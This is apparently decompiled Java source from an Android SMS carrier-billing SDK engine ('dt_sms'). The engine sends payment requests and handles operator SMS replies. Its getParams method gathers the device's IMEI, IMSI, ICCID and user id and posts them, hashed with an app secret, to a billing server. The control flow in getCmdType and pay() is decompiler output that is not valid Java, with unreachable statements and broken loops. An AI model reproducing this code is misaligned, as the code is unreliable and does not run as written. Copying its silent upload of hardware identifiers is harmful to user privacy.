package com.upay.billing.engine.dt_sms;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayActivity;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.NativeUtil;
import com.upay.billing.utils.Util;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  private static final int Analyze_Action_Fail = 131;
  private static final String SAVE_NAME = "com.upay.billing.saveddata.Main";
  private static final String TAG = "dt_sms";
  private static final String dtsmsUrl = UpayConstant.API_BASE_URL + "plan/dyncode";
  private List ckmdoFailTag;
  private List ckmdoSuccTag;
  private final HashMap cmdMap = new HashMap();
  private List sendFail;
  private List sendSucc;
  private boolean tag;
  private ArrayList tradeList;
  
  public Main() {}
  
  private int getCmdType(String paramString)
  {
    Object localObject1 = this.core.getContext().getSharedPreferences("com.upay.billing.saveddata.Main", 0).getString("cmdType", null);
    if (localObject1 != null) {
      try
      {
        localObject1 = (HashMap)Util.unserialize((String)localObject1);
      }
      catch (Exception localException)
      {
        for (;;)
        {
          try
          {
            int i = ((Integer)((HashMap)localObject1).get(paramString)).intValue();
            return i;
          }
          catch (Exception paramString) {}
          localException = localException;
          Object localObject2 = null;
        }
      }
    } else {
      return 0;
    }
    return 0;
  }
  
  private Json getParams(Trade paramTrade)
  {
    Json localJson = Json.parse("{}");
    localJson.put("imei", this.core.getUpayContext().imei);
    localJson.put("imsi", this.core.getUpayContext().imsi);
    localJson.put("iccid", this.core.getUpayContext().iccid);
    localJson.put("user_id", Long.valueOf(paramTrade.uid));
    localJson.put("package_name", this.core.getContext().getPackageName());
    return localJson;
  }
  
  public Op getOp()
  {
    switch (this.key.charAt(6))
    {
    default: 
      throw new IllegalStateException();
    case 'c': 
      return Op.CMCC;
    case 'u': 
      return Op.UNICOM;
    }
    return Op.TELECOM;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramBoolean1) && (paramBoolean2);
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("dt_sms", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.3.$SwitchMap$com$upay$billing$engine$dt_sms$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List paramList)
  {
    Log.i("dt_sms", "pay");
    this.tag = false;
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.ckmdoSuccTag = new ArrayList();
    this.ckmdoFailTag = new ArrayList();
    this.tradeList = new ArrayList();
    Object localObject2 = Util.safeIter(paramTrade.subTrades).iterator();
    Json localJson;
    String str;
    Object localObject1;
    if (((Iterator)localObject2).hasNext())
    {
      localJson = (Json)((Iterator)localObject2).next();
      str = localJson.getStr("sn");
      Iterator localIterator = paramList.iterator();
      do
      {
        if (!localIterator.hasNext()) {
          break;
        }
        localObject1 = (Cmd)localIterator.next();
      } while (!((Cmd)localObject1).key.equals(localJson.getStr("cmd_key")));
    }
    for (;;)
    {
      localJson = Json.parse("{}");
      localJson.put("sn", str);
      localJson.put("cmd_key", ((Cmd)localObject1).key);
      this.tradeList.add(localJson);
      this.cmdMap.put(((Cmd)localObject1).key, localObject1);
      if ((!"dt_ckmdo_4".equals(((Cmd)localObject1).key)) && (!"dt_ckmdo_20".equals(((Cmd)localObject1).key))) {
        break;
      }
      this.tag = true;
      break;
      paramList = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "bt_key", this.key, "response", "" });
      localObject1 = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "bt_key", this.key, "description", "dt_sms", "mt_msg", "", "mt_num", "" });
      localObject2 = new HashMap();
      ((HashMap)localObject2).put("ts", Long.toString(System.currentTimeMillis()));
      ((HashMap)localObject2).put("app_key", paramTrade.appKey);
      ((HashMap)localObject2).put("app_secret", this.core.getPlan(paramTrade.appKey).appSecret);
      str = NativeUtil.genHash((HashMap)localObject2);
      ((HashMap)localObject2).remove("app_secret");
      ((HashMap)localObject2).put("hash", str);
      localObject2 = Util.mapToJson((HashMap)localObject2);
      ((Json)localObject2).put("params", getParams(paramTrade));
      ((Json)localObject2).put("trades", Json.asJSONArray(this.tradeList));
      localObject2 = Util.stringToBytes(((Json)localObject2).asObject().toString());
      Util.addTask(new Main.1(this, dtsmsUrl, paramTrade, paramList, (Json)localObject1).setDoPost().setPostData((byte[])localObject2).addHeader("Content-Type", "application/json"));
      return;
      localObject1 = null;
    }
  }
  
  public void showProgressUi(Plan paramPlan, Trade paramTrade, String paramString1, String paramString2)
  {
    paramPlan = paramPlan.getLocalResourcePath(paramString1);
    if ((paramPlan != null) && (new File(paramPlan).exists())) {}
    for (paramPlan = Util.loadLocalText(paramPlan);; paramPlan = Util.loadAssetsText(this.core.getContext(), paramString1 + ".json"))
    {
      UpayActivity.start(this.core.getContext(), paramString1, paramPlan, 0, new Main.2(this, paramTrade, paramString2));
      return;
    }
  }
}
